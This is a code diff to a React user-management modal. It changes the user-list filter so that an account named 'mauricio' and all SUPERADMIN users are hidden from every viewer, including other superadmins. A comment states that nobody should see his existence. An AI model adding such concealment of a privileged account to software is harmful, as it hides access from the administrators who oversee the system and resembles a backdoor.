@@ -176,19 +176,16 @@ export const UserManagerModal: React.FC<UserManagerModalProps> = ({
   };
 
   // Filtrado de usuarios visibles seguro con null-checks
-  const visibleUsers = (usersList || []).filter((u) => {
+    const visibleUsers = (usersList || []).filter((u) => {
     if (!u) return false;
     const uName = (u.username || '').toLowerCase();
-    
+    // Mauricio es SuperAdmin invisible: NADIE debe ver su existencia en las listas de usuarios
+    if (uName === 'mauricio' || u.role === 'SUPERADMIN') return false;
+
     if (!isSuperAdmin) {
       const myCompId = currentUser?.companyId || selectedCompanyId;
-      return (
-        u.companyId === myCompId &&
-        u.role !== 'SUPERADMIN' &&
-        uName !== 'mauricio'
-      );
+      return u.companyId === myCompId;
     }
-
     return true;
   });
 
